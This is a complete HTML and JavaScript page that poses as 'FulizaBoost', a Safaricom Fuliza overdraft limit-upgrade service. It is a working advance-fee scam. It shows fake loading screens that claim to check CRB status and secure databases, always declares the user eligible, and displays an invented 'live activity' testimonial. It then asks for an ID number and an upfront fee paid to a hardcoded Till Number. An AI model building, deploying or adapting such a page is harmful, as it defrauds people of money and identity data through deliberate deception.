<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FulizaBoost</title>

<style>
body {
  margin:0;
  font-family: Arial, sans-serif;
  background:#f3f4f6;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}

/* CARD */
.card {
  background:white;
  padding:25px;
  border-radius:20px;
  width:90%;
  max-width:380px;
  box-shadow:0 10px 30px rgba(0,0,0,0.1);
  text-align:center;
}

/* INPUT */
.input {
  width:100%;
  padding:14px;
  border-radius:12px;
  border:1px solid #ddd;
  margin-top:10px;
}

/* BUTTONS */
button {
  width:100%;
  padding:15px;
  border:none;
  border-radius:12px;
  font-size:16px;
  margin-top:15px;
}

.green { background:#16a34a; color:white; }
.dark { background:#0f172a; color:white; }

/* LOADER */
.loader {
  width:50px;
  height:50px;
  border:5px solid #e5e7eb;
  border-top:5px solid #16a34a;
  border-radius:50%;
  animation:spin 1s linear infinite;
  margin:auto;
}

@keyframes spin {
  100% { transform:rotate(360deg); }
}

/* GRID */
.grid {
  display:grid;
  grid-template-columns:1fr 1fr;
  gap:10px;
}

.box {
  padding:15px;
  border-radius:12px;
  background:#f9fafb;
  cursor:pointer;
  border:2px solid transparent;
}

.box.active {
  border:2px solid #16a34a;
  background:#e8f5e9;
}

.fee {
  font-size:12px;
  color:#666;
}

/* SUCCESS */
.success-icon {
  width:80px;
  height:80px;
  background:#16a34a;
  color:white;
  border-radius:50%;
  display:flex;
  align-items:center;
  justify-content:center;
  font-size:30px;
  margin:0 auto 20px;
}

.phone {
  color:#16a34a;
  font-weight:bold;
}

/* MODAL */
.modal {
  position:fixed;
  top:0; left:0;
  width:100%; height:100%;
  background:rgba(0,0,0,0.5);
  display:none;
  align-items:center;
  justify-content:center;
}

.modal-content {
  background:white;
  width:90%;
  max-width:400px;
  border-radius:20px;
  overflow:hidden;
}

/* HEADER */
.modal-header {
  background:#16a34a;
  color:white;
  padding:20px;
}

/* BODY */
.modal-body {
  padding:20px;
}

/* INFO BOX */
.info-box {
  background:#e8f5e9;
  padding:15px;
  border-radius:12px;
  font-size:14px;
  margin-bottom:15px;
}

/* ACTIONS */
.modal-actions {
  display:flex;
  gap:10px;
}

.cancel-btn {
  flex:1;
  background:#f3f4f6;
}

.pay-btn {
  flex:1;
  background:#16a34a;
  color:white;
}
</style>
</head>

<body>

<div id="app"></div>

<!-- MODAL -->
<div class="modal" id="modal">
  <div class="modal-content">
    <div class="modal-header">
      <small>SECURE FULIZA APPLICATION</small>
      <h3 id="modalTitle"></h3>
    </div>

    <div class="modal-body">
      <div class="info-box" id="modalFee"></div>

      <input class="input" placeholder="ID Number">
      <input class="input" value="0704343709">

      <div class="modal-actions">
        <button class="cancel-btn" onclick="closeModal()">Cancel</button>
        <button class="pay-btn" id="payBtn">Pay</button>
      </div>
    </div>
  </div>
</div>

<script>
let step = 1;
let selectedAmount = 3000;

const limits = [
{amount:3000, fee:250},
{amount:5000, fee:293},
{amount:7500, fee:350},
{amount:10000, fee:500},
{amount:12500, fee:747},
{amount:16000, fee:898},
{amount:21000, fee:1015},
{amount:25500, fee:1220},
{amount:30000, fee:1533},
{amount:35000, fee:1730},
{amount:45000, fee:2000},
{amount:60000, fee:2250},
{amount:70000, fee:2500}
];

function getFee(a){
  return limits.find(l=>l.amount===a).fee;
}

function render(){
  const app = document.getElementById("app");

  /* STEP 1 */
  if(step===1){
    app.innerHTML = `
    <div class="card">
      <h2>Fuliza Plus+</h2>
      <p>Verify your identity</p>
      <input class="input" placeholder="Enter M-Pesa Number">
      <button class="green" onclick="next()">Check My Eligibility</button>
    </div>`;
  }

  /* LOADING */
  if(step>=2 && step<=5){
    const texts = [
      "Connecting...",
      "Checking Usage History...",
      "Verifying CRB Status...",
      "Finalizing Trust Score..."
    ];
    app.innerHTML = `
    <div class="card">
      <div class="loader"></div>
      <h3>${texts[step-2]}</h3>
      <p>Accessing secure databases...</p>
    </div>`;
    setTimeout(()=>{step++;render();},1500);
  }

  /* SUCCESS */
  if(step===6){
    app.innerHTML = `
    <div class="card">
      <div class="success-icon">✓</div>
      <h2>Congratulations!</h2>
      <p>High Trust Score Detected. 
      <span class="phone">0704343709</span> is eligible for a boost.</p>
      <button class="dark" onclick="next()">Proceed to Upgrade Limit</button>
    </div>`;
  }

  /* LIMITS */
 if(step===7){
  app.innerHTML = `
  <div style="width:90%; max-width:420px; margin:auto;">

    <h1 style="text-align:center; color:#111827; font-weight:700;">FulizaBoost</h1>
    <p style="text-align:center; color:#6b7280;">
      Instant Limit Increase • Same Day Access
    </p>

    <!-- LIVE ACTIVITY -->
    <div style="
      background:#f9fafb;
      padding:15px;
      border-radius:15px;
      margin:15px 0;
      font-size:14px;
    ">
      <b style="color:#16a34a;">LIVE ACTIVITY</b><br>
      <span id="liveText">
        Faith W. (0712****11) boosted to <b style="color:#16a34a;">Ksh 45,000</b> just now
      </span>
    </div>

    <h3>Select Your New Approved Limit</h3>

    <div class="grid">
      ${limits.map(l=>`
        <div class="box ${l.amount===selectedAmount?'active':''}" onclick="select(${l.amount})">
          <strong style="color:#16a34a;">Ksh ${l.amount}</strong>
          <div class="fee">FEE: KSH ${l.fee}</div>
        </div>
      `).join("")}
    </div>

    <button style="
      margin-top:20px;
      background:#15803d;
      border-radius:20px;
      padding:18px;
    " onclick="openModal()">
      ⚡ SELECT A LIMIT
    </button>

    <p style="text-align:center; margin-top:15px; color:#16a34a;">
      💬 Need help? Chat with Support
    </p>

  </div>
  `;

  startLiveUpdates();
 }
}

function next(){
  step++;
  render();
}

function select(a){
  selectedAmount = a;
  render();
}

function openModal(){
  let fee = getFee(selectedAmount);

  document.getElementById("modal").style.display="flex";

  document.getElementById("modalTitle").innerText =
  "Limit will be boosted to Ksh " + selectedAmount;

  document.getElementById("modalFee").innerHTML =
  `Enter your Safaricom number for VERIFICATION! Once payment to Till Number 
  <b>6363781</b> is confirmed, your boost request will begin processing.`;

  document.getElementById("payBtn").innerText =
  "Pay Ksh " + fee;
}

function closeModal(){
  document.getElementById("modal").style.display="none";
}

render();
</script>

</body>
</html>
